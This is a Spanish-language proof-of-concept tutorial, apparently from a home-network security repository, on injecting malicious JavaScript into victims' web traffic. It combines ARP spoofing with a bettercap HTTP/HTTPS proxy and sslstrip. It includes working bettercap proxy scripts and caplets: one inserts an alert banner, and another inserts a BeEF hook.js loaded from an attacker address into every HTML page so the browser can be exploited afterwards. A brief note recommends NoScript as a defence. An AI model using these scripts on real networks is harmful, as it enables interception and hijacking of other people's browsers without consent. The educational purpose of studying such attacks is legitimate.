# POC: Inyectar Javascript malicioso

Javascript es un lenguaje de programación utilizado en programación web que se ejecuta de lado del cliente, es decir, cualquier acción realizada en Javascript tendrá un reflejo en los equipos de aquellas personas que visiten la página web.

Aprovechando esta caracterísitca de Javascript podemos inyectar un fichero Javascript (que contiene código malicioso) dentro de las peticiones HTTP para poder realizar diferentes acciones ([como minar criptomonedas](https://www.europapress.es/portaltic/internet/noticia-the-pirate-bay-utiliza-cpu-usuarios-deshacerse-anuncios-mineria-criptomoneda-20170918140205.html))

## Inyección de Javascript

Para poder inyectar Javascript dentro de las peticiones, tendremos que realizar un ataque de arp spoofing, de forma que podemos realizar tratamiento de dichos paquetes.

Posteriormente lo que tenemos que realizar es montar un proxy http/https, de forma que todas las peticiones de nuestro objetivo pasen por este y queden infectadas.

Para poder modificar las peticiones usaremos el proxy http de bettercap. En primer lugar usaremos un código Javascript de ejemplo.

```
function onLoad(){
   log("Script loaded..");
}

function onResponse(req,res){

 if (res.ContentType.indexOf('text/html') == 0){

 	var body = res.ReadBody();

	 res.Body = body.replace(
	 '</head>',
	 '<script type="text/javascript">alert(\"@cyberh99 wa    s here\")</script></head>'
	 );
	}

}
```
[injectionJS.js](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/injectionJS.js)

Este código Javascript realiza una acción muy sencilla, se encarga de reemplazar la etiqueta _head_ del código html de cualquier página agregando una sencilla ventana que dice "@cyberh99 was here". Con esto podemos comprobar como funcionala inyección de Javascript.

Dentro del código encontramos dos funciones, las cuales _tienen que estar para el funcionamiento del script_, estas tienen la siguiente relevancia:

* onLoad() --> Se ejecuta cuando el script se cargca
* onResponse(req,res) --> Se ejecuta una vez se envía el paquete al servidor real y se recibe respuesta

Una vez que tenemos el código Javascript malicioso simplemente crearemos nuestro caplet para ejecutar Bettercap:

```
set http.proxy.script injectionJS.js
set https.proxy.script injectionJS.js

set http.proxy.sslstrip true
set https.proxy.sslstrip true

http.proxy on
https.proxy on

```
[injectionTest.cap](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/injectionTest.cap)

!!!warning
    Existen extensiones para los diferentes navegadores como Firefox y Google Chrome que permite deshabilitar Javascript de las diferentes páginas web, habilitando exclusivamente aquellos que sean de confianza.

    Entre las diferentes opciones, la más usada y recomendad es [noScript](https://noscript.net/)
## Beef: Browser Explotation Framework

El código Javascript que hemos inyectado es muy simple, para una mera demostración, sin embargo, podemos hacer cosas mucho más complejas, un ejemplo de ello es Beef.

Beef (Browser Explotation Framework) es una herramienta que nos ofrece la opción de infectar diferentes navegadores con código javascript, de forma que podamos realizar acciones sobre la máquina infectada. Este framework puede estar conectado con Metasploit o ser utilizado para ingenieria social.

Para poder inyectar el códgio javascript de beef utilizaremos el siguiente código:

```javascript
function onLoad() {
    log( "BeefInject loaded." );
    log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace(
                '</head>',
                '<script type="text/javascript" src="http://10.0.2.15:3000/hook.js"></script></head>'
            );
        }
    }
}
```
[beefJavascript.js](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/beefJavascript.js)

```
set http.proxy.script beefJavascript.js
set https.proxy.script beefJavascript.js

set http.proxy.sslstrip true
set https.proxy.sslstrip true

http.proxy on
https.proxy on
```
[beefInjection.cap](https://github.com/cyberh99/Seguridad-en-redes-dom-sticas/blob/master/scripts/capplets/beefInjection.cap)

Posteriormente disponemos de todo el potencial que nos ofrece beef para realizar acciones de post explotación.
